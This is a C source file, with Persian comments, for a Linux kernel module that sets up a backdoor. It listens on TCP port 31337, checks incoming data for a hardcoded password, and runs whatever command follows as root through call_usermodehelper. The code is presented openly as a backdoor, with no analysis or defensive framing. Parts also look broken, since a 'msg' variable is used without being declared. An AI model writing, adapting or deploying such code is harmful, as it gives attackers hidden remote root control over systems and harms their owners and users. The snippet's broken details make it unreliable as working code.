#include <linux/net.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include "common.h"

#define MAGIC_PORT 31337
#define BACKDOOR_PASSWORD "DSK_SECRET_2025"

// اجرای دستورات سیستمی
static int exec_command(char *cmd) {
    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/bin", NULL };
    
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

// هندلر بک‌دور
static void backdoor_handler(struct socket *sock) {
    struct kvec vec;
    char buffer[1024];
    int len;

    vec.iov_base = buffer;
    vec.iov_len = sizeof(buffer);

    kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);

    if (strncmp(buffer, BACKDOOR_PASSWORD, strlen(BACKDOOR_PASSWORD)) == 0) {
        char *cmd = buffer + strlen(BACKDOOR_PASSWORD) + 1;
        exec_command(cmd);
    }
}

// ایجاد سرویس بک‌دور
static int create_backdoor(void) {
    struct socket *sock;
    int ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    
    if (ret < 0) return ret;

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(MAGIC_PORT),
        .sin_addr.s_addr = INADDR_ANY,
    };

    sock->ops->bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    sock->ops->listen(sock, 5);

    while (!kthread_should_stop()) {
        struct socket *client;
        kernel_accept(sock, &client, 0);
        backdoor_handler(client);
        sock_release(client);
    }
    return 0;
}